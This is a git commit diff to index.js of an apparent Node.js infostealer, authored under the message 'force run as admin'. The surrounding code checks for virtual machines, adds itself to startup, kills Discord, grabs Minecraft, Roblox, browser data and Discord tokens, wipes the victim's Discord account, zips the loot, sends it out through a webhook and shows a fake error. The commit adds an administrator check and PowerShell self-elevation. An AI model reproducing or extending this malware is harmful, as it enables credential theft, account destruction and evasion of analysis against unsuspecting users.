145ecf7e3fb710a569ce512c9e0c6cd9b9404d32
Yuuto <thelio.trinite@outlook.com>
2023-04-16 14:59:54 +0200

    force run as admin

--- index.js
+++ index.js
@@ -4,33 +4,41 @@ const { sep, join } = require('path');
 const { mkdtempSync } = require('fs');
 const os = require('os');
 const config = require('./config');
-const { spawnSync } = require('child_process');
+const { spawnSync, execSync, exec } = require('child_process');
 const { checkVM, killTasks } = require('./functions/anti-vm');
 const { runningFromExecutable } = require('./util/general');
-const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
-module.exports.tempFolder = tempFolder;
-process.argv0.includes('node') && spawnSync('explorer', [tempFolder]);
 
 if (config.vmProtect && checkVM()) {
   if (config.bsodIfVm) {
     killTasks();
   } else {
-    process.exit();
+    process.exit(0);
   }
 } else {
-  if (config.addToStartup && runningFromExecutable()) require('./functions/startup');
-  config.discord.killProcess && require('./functions/kill-discord');
-  require('./functions/grab-mc');
-  require('./functions/grab-roblox');
-  require('./functions/grab-browsers-data');
+  exec('net session', { windowsHide: true }).on('exit', (code) => {
+    if (code === 0) {
+      const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
+      module.exports.tempFolder = tempFolder;
+      process.argv0.includes('node') && spawnSync('explorer', [tempFolder]);
 
-  require('./functions/grab-discord-token').then(() => {
-    require('./functions/nuke-discord-account');
-    if (config.discord.autoJoinGuild && typeof config.discord.autoJoinGuild === 'string') require('./functions/auto-join-guild');
+      if (config.addToStartup && runningFromExecutable()) require('./functions/startup');
+      config.discord.killProcess && require('./functions/kill-discord');
+      require('./functions/grab-mc');
+      require('./functions/grab-roblox');
+      require('./functions/grab-browsers-data');
 
-    require('./functions/zip').then(zipFile => {
-      require('./functions/webhook')(zipFile);
-    });
+      require('./functions/grab-discord-token').then(() => {
+        require('./functions/nuke-discord-account');
+        if (config.discord.autoJoinGuild && typeof config.discord.autoJoinGuild === 'string') require('./functions/auto-join-guild');
+
+        require('./functions/zip').then(zipFile => {
+          require('./functions/webhook')(zipFile);
+        });
+      });
+      config.fakeError && require('./functions/fake-error');
+    } else { // Not running as administrator
+      execSync(`powershell Start-Process -FilePath "${process.argv0}" -Verb RunAs`);
+      process.exit(0);
+    }
   });
-  config.fakeError && require('./functions/fake-error');
 }
